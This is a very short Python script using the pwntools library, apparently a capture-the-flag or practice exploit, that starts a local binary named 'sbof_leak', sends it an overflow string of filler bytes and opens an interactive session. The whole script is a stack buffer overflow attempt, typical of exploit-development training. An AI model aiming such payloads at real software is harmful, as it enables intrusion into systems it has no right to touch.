from pwn import *

p = process('./sbof_leak')

payload = ''
payload += 'a' * 8 + 'b' * 4
p.sendline(payload)
p.interactive()
